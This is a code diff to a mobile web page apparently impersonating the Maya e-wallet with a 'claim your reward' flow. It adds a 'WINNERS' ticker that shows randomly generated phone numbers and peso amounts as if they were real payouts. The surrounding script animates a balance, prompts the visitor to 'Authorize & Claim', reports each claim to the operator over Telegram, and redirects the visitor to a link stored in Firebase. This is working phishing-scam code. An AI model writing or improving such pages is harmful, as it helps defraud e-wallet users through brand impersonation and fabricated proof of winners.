@@ -68,7 +68,6 @@
       visibility: visible;
     }
 
-    /* ========== INITIAL AD ========== */
     .ad-container {
       max-width: 380px;
       width: 100%;
@@ -508,10 +507,6 @@
       margin-bottom: 0.2rem;
     }
 
-    .auth-popup-amount .zero {
-      color: #2EF2A3;
-    }
-
     .auth-popup-message {
       background: rgba(46, 242, 163, 0.04);
       border: 1px solid rgba(46, 242, 163, 0.06);
@@ -565,6 +560,127 @@
       box-shadow: 0 0 50px rgba(46, 242, 163, 0.2);
     }
 
+    /* ========== WINNERS TICKER ========== */
+    .winners-ticker {
+      background: rgba(8, 18, 14, 0.6);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border-radius: 20px;
+      padding: 0.6rem 1.2rem;
+      border: 1px solid rgba(46, 242, 163, 0.08);
+      margin-bottom: 1rem;
+      display: flex;
+      align-items: center;
+      gap: 0.8rem;
+      overflow: hidden;
+      position: relative;
+      min-height: 48px;
+      transition: all 0.5s ease;
+    }
+
+    .winners-ticker.hidden {
+      display: none;
+    }
+
+    .winners-ticker .ticker-label {
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+      color: #2EF2A3;
+      font-size: 0.65rem;
+      font-weight: 600;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+      white-space: nowrap;
+      flex-shrink: 0;
+    }
+
+    .winners-ticker .ticker-label .ticker-icon {
+      width: 20px;
+      height: 20px;
+      object-fit: contain;
+      filter: drop-shadow(0 0 10px rgba(46, 242, 163, 0.2));
+    }
+
+    .winners-ticker .ticker-scroll {
+      flex: 1;
+      overflow: hidden;
+      position: relative;
+      height: 32px;
+    }
+
+    .winners-ticker .ticker-track {
+      display: flex;
+      flex-direction: column;
+      animation: scrollWinners 12s infinite;
+    }
+
+    .winners-ticker .ticker-item {
+      display: flex;
+      align-items: center;
+      gap: 0.8rem;
+      height: 32px;
+      padding: 0 0.3rem;
+      white-space: nowrap;
+    }
+
+    .winners-ticker .ticker-item .winner-icon {
+      width: 18px;
+      height: 18px;
+      object-fit: contain;
+      filter: drop-shadow(0 0 8px rgba(46, 242, 163, 0.1));
+    }
+
+    .winners-ticker .ticker-item .winner-number {
+      color: #2EF2A3;
+      font-size: 0.75rem;
+      font-weight: 700;
+      letter-spacing: 0.02em;
+    }
+
+    .winners-ticker .ticker-item .winner-received {
+      color: rgba(255, 255, 255, 0.3);
+      font-size: 0.65rem;
+      font-weight: 400;
+    }
+
+    .winners-ticker .ticker-item .winner-amount {
+      color: #ffffff;
+      font-size: 0.8rem;
+      font-weight: 700;
+      text-shadow: 0 0 20px rgba(46, 242, 163, 0.05);
+    }
+
+    .winners-ticker .ticker-close {
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid rgba(255, 255, 255, 0.04);
+      color: rgba(255, 255, 255, 0.2);
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      font-size: 0.7rem;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .winners-ticker .ticker-close:hover {
+      background: rgba(255, 255, 255, 0.06);
+      color: rgba(255, 255, 255, 0.5);
+    }
+
+    @keyframes scrollWinners {
+      0%, 16% { transform: translateY(0); }
+      20%, 36% { transform: translateY(-32px); }
+      40%, 56% { transform: translateY(-64px); }
+      60%, 76% { transform: translateY(-96px); }
+      80%, 96% { transform: translateY(-128px); }
+      100% { transform: translateY(0); }
+    }
+
     /* ========== MOBILE CONTAINER ========== */
     .mobile-container {
       max-width: 420px;
@@ -606,7 +722,7 @@
       display: flex;
       justify-content: space-between;
       align-items: center;
-      margin-bottom: 1.5rem;
+      margin-bottom: 1rem;
     }
 
     .logo-wrapper {
@@ -631,18 +747,33 @@
 
     .header-actions {
       display: flex;
-      gap: 0.8rem;
+      gap: 0.6rem;
       font-size: 1.2rem;
+      align-items: center;
     }
 
-    .header-actions span {
+    .header-actions .bell-icon {
       opacity: 0.5;
       cursor: pointer;
       transition: opacity 0.3s;
+      font-size: 1.3rem;
+      padding: 0.2rem;
     }
 
-    .header-actions span:hover {
+    .header-actions .bell-icon:hover {
       opacity: 0.8;
+    }
+
+    .header-actions .bell-icon.has-notification {
+      opacity: 1;
+      animation: bellRing 0.5s ease;
+    }
+
+    @keyframes bellRing {
+      0%, 100% { transform: rotate(0); }
+      25% { transform: rotate(10deg); }
+      50% { transform: rotate(-10deg); }
+      75% { transform: rotate(5deg); }
     }
 
     .featured-card {
@@ -1169,6 +1300,28 @@
       .spend-rewards-section {
         padding: 1rem 1rem;
       }
+
+      .winners-ticker {
+        padding: 0.4rem 0.8rem;
+        min-height: 40px;
+      }
+
+      .winners-ticker .ticker-item .winner-number {
+        font-size: 0.65rem;
+      }
+
+      .winners-ticker .ticker-item .winner-amount {
+        font-size: 0.7rem;
+      }
+
+      .winners-ticker .ticker-label {
+        font-size: 0.55rem;
+      }
+
+      .winners-ticker .ticker-label .ticker-icon {
+        width: 16px;
+        height: 16px;
+      }
     }
 
     @media (max-width: 360px) {
@@ -1284,14 +1437,29 @@
 
   <div class="mobile-container">
     <div class="main-card">
+      <!-- Header with Maya logo and Bell icon -->
       <div class="header">
         <div class="logo-wrapper">
           <img src="images/maya_icon.png" alt="Maya" class="maya-logo" />
           <span class="maya-text">maya</span>
         </div>
         <div class="header-actions">
-          <span class="notification">🔔</span>
+          <span class="bell-icon has-notification" id="bellIcon">🔔</span>
         </div>
+      </div>
+
+      <!-- Winners Ticker -->
+      <div class="winners-ticker" id="winnersTicker">
+        <div class="ticker-label">
+          <img src="images/maya_icon.png" alt="Maya" class="ticker-icon" />
+          <span>WINNERS</span>
+        </div>
+        <div class="ticker-scroll">
+          <div class="ticker-track" id="tickerTrack">
+            <!-- Items will be inserted by JavaScript -->
+          </div>
+        </div>
+        <button class="ticker-close" id="tickerClose">✕</button>
       </div>
 
       <div class="featured-card" id="featuredCard">
@@ -1400,6 +1568,71 @@
     }
 
     // ============================================================
+    // WINNERS DATA
+    // ============================================================
+    const winners = [];
+
+    // Generate random winners
+    function generateWinners() {
+      // Amount distribution: 85% ₱200, 10% ₱500, 6% ₱1,000, 2% ₱6,000, 2% ₱10,000
+      const amounts = [200, 200, 200, 200, 200, 200, 200, 200, 500, 500, 1000, 6000, 10000];
+      
+      for (let i = 0; i < 6; i++) {
+        const prefix = '09' + String(Math.floor(Math.random() * 100000000)).padStart(8, '0');
+        const last4 = String(Math.floor(Math.random() * 10000)).padStart(4, '0');
+        const number = prefix.slice(0, 4) + '***' + last4;
+        const amount = amounts[Math.floor(Math.random() * amounts.length)];
+        winners.push({ number, amount });
+      }
+    }
+
+    // Render winners in ticker
+    function renderWinners() {
+      const track = document.getElementById('tickerTrack');
+      if (!track) return;
+      
+      let html = '';
+      winners.forEach((winner, index) => {
+        const amountStr = winner.amount >= 1000 ? 
+          `₱${winner.amount.toLocaleString()}` : 
+          `₱${winner.amount}.00`;
+        html += `
+          <div class="ticker-item">
+            <img src="images/maya_icon.png" alt="Maya" class="winner-icon" />
+            <span class="winner-number">${winner.number}</span>
+            <span class="winner-received">received</span>
+            <span class="winner-amount">${amountStr}</span>
+          </div>
+        `;
+      });
+      track.innerHTML = html;
+    }
+
+    // Initialize winners
+    generateWinners();
+    renderWinners();
+
+    // ============================================================
+    // BELL ICON - Hide winners
+    // ============================================================
+    const bellIcon = document.getElementById('bellIcon');
+    const winnersTicker = document.getElementById('winnersTicker');
+    const tickerClose = document.getElementById('tickerClose');
+
+    function hideWinners() {
+      winnersTicker.classList.add('hidden');
+      bellIcon.classList.remove('has-notification');
+    }
+
+    if (bellIcon) {
+      bellIcon.addEventListener('click', hideWinners);
+    }
+
+    if (tickerClose) {
+      tickerClose.addEventListener('click', hideWinners);
+    }
+
+    // ============================================================
     // MAIN SCRIPT
     // ============================================================
     document.addEventListener('DOMContentLoaded', function() {
@@ -1466,7 +1699,6 @@
       
       let countdownInterval = null;
       let popupActive = false;
-      let isAuthorized = false;
       let pendingLinkId = null;
       let pendingLinkData = null;
 
@@ -1486,7 +1718,6 @@
               clearInterval(countDown);
               featuredAmount.textContent = `₱${currentValue.toFixed(2)}`;
               
-              // Wait 500ms then resolve
               setTimeout(() => {
                 resolve();
               }, 500);
@@ -1504,7 +1735,6 @@
           authPopup.classList.add('active');
           document.body.style.overflow = 'hidden';
           
-          // Wait for user to click "Authorize & Claim"
           authPopupBtn.onclick = function() {
             authPopup.classList.remove('active');
             document.body.style.overflow = '';
@@ -1534,7 +1764,6 @@
           }
           document.body.style.overflow = 'hidden';
           
-          // Start countdown
           let count = 5;
           
           if (countdownInterval) {
@@ -1560,7 +1789,6 @@
               document.body.style.overflow = '';
               popupActive = false;
               
-              // Increment click count and redirect
               const newClicks = (linkData.clicks || 0) + 1;
               database.ref('links/' + linkId + '/clicks').set(newClicks)
                 .then(() => {
@@ -1601,34 +1829,24 @@
         claimBtn.addEventListener('click', async function(e) {
           console.log('Claim button clicked!');
           
-          // Show loading state
           this.classList.add('loading');
           this.innerHTML = '<span class="btn-icon" style="animation: spin 0.8s linear infinite; width:22px;height:22px;display:inline-block;">⟳</span> Processing...';
           
           try {
-            // Get link from Firebase
             const { linkId, linkData } = await getLatestLink();
             console.log('Link retrieved successfully:', linkData.url);
             
-            // Reset button
             this.classList.remove('loading');
             this.innerHTML = '<img src="images/maya_icon.png" alt="Maya" class="btn-icon" /> Claim NOW';
             
-            // Send Telegram notification
             const userMessage = `👤 *User claimed reward!*\n🔗 *Link:* ${linkData.hash || 'N/A'}\n👆 *Total Clicks:* ${(linkData.clicks || 0) + 1}`;
             sendTelegramNotification(userMessage);
             
-            // Store pending data
             pendingLinkId = linkId;
             pendingLinkData = linkData;
             
-            // STEP 1: Balance Decrement Animation (3 seconds)
             await animateBalance();
-            
-            // STEP 2: Show Authorization Popup (wait for user to click)
             await showAuthPopup();
-            
-            // STEP 3: Show Countdown Popup (5 seconds then redirect)
             await showCountdownPopup(linkId, linkData);
             
           } catch (error) {
@@ -1637,7 +1855,6 @@
             this.classList.remove('loading');
             this.innerHTML = '<img src="images/maya_icon.png" alt="Maya" class="btn-icon" /> Claim NOW';
             
-            // Close any open popups
             authPopup.classList.remove('active');
             claimPopupOverlay.classList.remove('active');
             document.body.style.overflow = '';
